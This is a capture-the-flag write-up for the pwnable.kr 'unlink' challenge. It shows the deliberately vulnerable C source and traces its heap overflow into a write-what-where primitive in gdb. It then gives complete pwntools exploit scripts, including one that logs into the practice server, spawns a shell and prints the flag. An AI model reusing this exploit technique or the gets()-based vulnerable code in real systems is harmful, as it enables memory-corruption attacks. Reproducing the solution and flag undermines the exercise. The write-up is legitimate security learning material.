# UNLINK
This was the hardest one for me yet - took me almost a day in total. Let's dive in.


## Source code:
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
typedef struct tagOBJ{
	struct tagOBJ* fd;
	struct tagOBJ* bk;
	char buf[8];
}OBJ;

void shell(){
	system("/bin/sh");
}

void unlink(OBJ* P){
	OBJ* BK;
	OBJ* FD;
	BK=P->bk;
	FD=P->fd;
	FD->bk=BK;
	BK->fd=FD;
}
int main(int argc, char* argv[]){
	malloc(1024);
	OBJ* A = (OBJ*)malloc(sizeof(OBJ));
	OBJ* B = (OBJ*)malloc(sizeof(OBJ));
	OBJ* C = (OBJ*)malloc(sizeof(OBJ));

	// double linked list: A <-> B <-> C
	A->fd = B;
	B->bk = A;
	B->fd = C;
	C->bk = B;

	printf("here is stack address leak: %p\n", &A);
	printf("here is heap address leak: %p\n", A);
	printf("now that you have leaks, get shell!\n");
	// heap overflow!
	gets(A->buf);

	// exploit this unlink!
	unlink(B);
	return 0;
}
```
Looks like a:
- `heap overflow` in `main`!
- a `ret2win` function - `shell`

Let's see what we can do :)
## Recon
use `pwntools` to get a cyclic string of 100 chars:
```bash
pwn cyclic 100
# aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```
Let's test the overflow:
```bash
gdb ./unlink
r
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```
We get a `segfault`!

![write-what-where](https://github.com/user-attachments/assets/6187d154-8ff7-401a-82ce-bba2d46c28df)


Looking at the data, we can see the `segfault` was on `unlink+29` when the program tries to write the value of `edx` which is `haaa` to the memory address @ `EAX + 4` (`gaaa` -> `0x61616167` -> `0x61616167 + 4` -> `0x6161616b`). We found a Write-What-Where primitive! 
We can now use those commands to check what input is being written where:
```bash
pwn cyclic -l 'gaaa'
24
pwn cyclic -l 'haaa'
28
```
We can see that:
- `EAX` is 24-28
- `EDX` is 28-32

Nice!
when we keep looking at the assembly of the function, we notice that we can't change the return pointer, as the next instruction will make the program crush.
Let's keep digging tho.
I fuzzed the program with values that should be able to pass all writes (using the heap because it is writable).
I just pressed `ni` to go to every assembly line and after A LOT of time I found this code in the `main` function:
```sh
0x080485f2 <+195>:	call   0x8048504 <unlink>
0x080485f7 <+200>:	add    esp,0x10
0x080485fa <+203>:	mov    eax,0x0
# interesting part
0x080485ff <+208>:	mov    ecx,DWORD PTR [ebp-0x4]
0x08048602 <+211>:	leave
0x08048603 <+212>:	lea    esp,[ecx-0x4]
0x08048606 <+215>:	ret
```
The code is right after the call to `unlink` (the write-what-where), maybe we can use it?
Looks like the `ECX` register will take the value from the memory address @ `EBP-0x4`. What if we can write to `ebp-0x4` an address that points to the heap (because it is where our input goes) and contains the address of shell? then `ECX` will contain its value and it will be used as the return pointer!
Let's develop an exploit!

## Exploit
we can get the address of `shell` like this:
```bash
nm ./unlink | grep shell
# 080484eb T shell
```
So in python:
```python
from pwn import *

SHELL_ADDRESS = p32(0x80484eb)
```
We can now create a process:
```python
p = process("./unlink")
```
and attach a debugger (notice I placed a break point at the line after `unlink`):
```python
gdb.attach(p, gdbscript="""
    set pagination off
    set disassembly-flavor intel
    break *0x080485ff
    c
""")
```
we can then use save the `stack` and `heap` leaks as variables:
```python
stack_leak_text = p.recvline().decode().split(": ")[-1].strip()
stack_leak = int(stack_leak_text, 16)
print(f"Stack Leak: {hex(stack_leak)}")

heap_leak_text = p.recvline().decode().split(": ")[-1].strip()
heap_leak = int(heap_leak_text, 16)
print(f"Heap Leak: {hex(heap_leak)}")
```
We can now check in `gdb` what are the offsets:
- stack-leak is printing the `A` object
	- the `A` object is at `ebp-0x14` (check `main+46`)
	- the return pointer is @ `ebp-0x4`
	- `0x14-0x4` = 16
	- so the offset from the leak to the pointer is `16`
- To get the heap leak I just used `gdb` and `x/12x $heap-leak` to check the values and saw that it is 8 bytes away from it.

```python
return_pointer_address = stack_leak + 16 # offset to $ebp-0x4
heap_input_address = heap_leak + 8 # offset to our input
```
We can then build the payload:
```python
payload = b''
payload += SHELL_ADDRESS
payload += b'A' * 20 # padding
payload += p32(return_pointer_address - 4) # remeber to sub 4
payload += p32(heap_input_address + 4) # remeber to add 4
```
Then send it, and get to interactive!
```python
p.sendline(payload)

p.interactive()
```
Let's run it and see what we have!
```sh
python3 local_exp.py
```
A new windows is opened with `gdb` running, and hitting the `breakpoint` we specified.
We can see in the `pwndbg` context that the return pointer successfully changed to `shell` address!

![shell](https://github.com/user-attachments/assets/14c67ddb-d015-48d6-bd14-132de4023d9a)


For some reason, when I press `c` to `continue` the program is crushing, although it is already in the function `shell`. I decided to run it on the server.
**NOTICE, after some checking and errors looks like the padding on the `pwnable` server needs to be `12` chars instead of `20` (you can use `pwn cyclic` to check that)** So let's re-write the exploit!
```python
from pwn import *

SHELL_ADDRESS = p32(0x80484eb)


remote_ssh = ssh('unlink', 'pwnable.kr', password='guest', port=2222)
p = remote_ssh.process("./unlink")

stack_leak_text = p.recvline().decode().split(": ")[-1].strip()
stack_leak = int(stack_leak_text, 16)
print(f"Stack Leak: {hex(stack_leak)}")

heap_leak_text = p.recvline().decode().split(": ")[-1].strip()
heap_leak = int(heap_leak_text, 16)
print(f"Heap Leak: {hex(heap_leak)}")

return_pointer_address = stack_leak + 16 # offset to $ebp-0x4
heap_input_address = heap_leak + 8 # offset to our input

payload = b''
payload += SHELL_ADDRESS
payload += b'A' * 12 # padding
payload += p32(return_pointer_address - 4) # remeber to sub 4 
payload += p32(heap_input_address + 4) # remeber to add 4 
p.sendline(payload)

p.interactive()
```
And the results:
```sh
python3 exploit.py
[+] Connecting to pwnable.kr on port 2222: Done
[*] unlink@pwnable.kr:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.179
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[+] Starting remote process None on pwnable.kr: pid 83701
[!] ASLR is disabled for '/home/unlink/unlink'!
[+] Opening new channel: b'mktemp': Done
[+] Receiving all data: Done (20B)
[*] Closed SSH channel with pwnable.kr
Stack Leak: 0xffb54714
Heap Leak: 0x9397410
[*] Switching to interactive mode
now that you have leaks, get shell!
$ $ ls
flag  intended_solution.txt  unlink  unlink.c
$ $ cat flag
conditional_write_what_where_from_unl1nk_explo1t
```

Good Game!
